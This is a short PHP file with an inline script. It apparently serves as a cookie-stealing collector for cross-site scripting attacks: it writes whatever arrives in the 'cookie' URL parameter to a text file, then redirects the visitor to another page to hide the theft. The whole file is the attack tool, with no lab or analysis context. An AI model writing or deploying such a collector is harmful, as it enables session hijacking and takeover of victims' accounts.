<?php
$f=fopen("1.txt","w");
Fwrite($f,$_GET['cookie'],"\n");
fclose($f);
?>
<script>
window.location.href="meinv.php";
</script>